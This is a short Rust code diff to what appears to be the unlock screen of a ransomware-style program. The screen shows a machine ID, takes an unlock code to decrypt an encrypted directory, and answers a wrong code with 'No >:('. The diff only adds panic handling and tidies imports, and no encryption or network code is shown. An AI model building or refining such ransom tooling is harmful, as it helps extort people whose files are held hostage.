@@ -1,7 +1,10 @@
-use web_view::*;
-use serde::{Deserialize};
-use crate::{perform_action_on_directory, Action};
+use std::panic;
+
+use serde::Deserialize;
 use uuid::Uuid;
+use web_view::*;
+
+use crate::{Action, perform_action_on_directory};
 
 pub fn render_ui(machine_id: &Uuid, encrypted_root_dir: &str) {
     let html_content = include_str!("../assets/ui.html");
@@ -19,8 +22,14 @@ pub fn render_ui(machine_id: &Uuid, encrypted_root_dir: &str) {
             match serde_json::from_str(arg).unwrap() {
                 Init => webview.eval(&format!("renderMachineInfo('{}')", machine_id)),
                 Unlock { code } => {
-                    perform_action_on_directory(&code, &Action::Decrypt, encrypted_root_dir);
-                    webview.eval(&format!("showUnlockResults('{}')", "Done!"))
+                    let results = panic::catch_unwind(|| {
+                        perform_action_on_directory(&code, &Action::Decrypt, encrypted_root_dir);
+                    });
+
+                    match results {
+                        Ok(()) => webview.eval(&format!("showUnlockResults('{}')", "Done!")),
+                        Err(_err) => webview.eval(&format!("showUnlockResults('{}')", "No >:(")),
+                    }
                 }
             }
         })
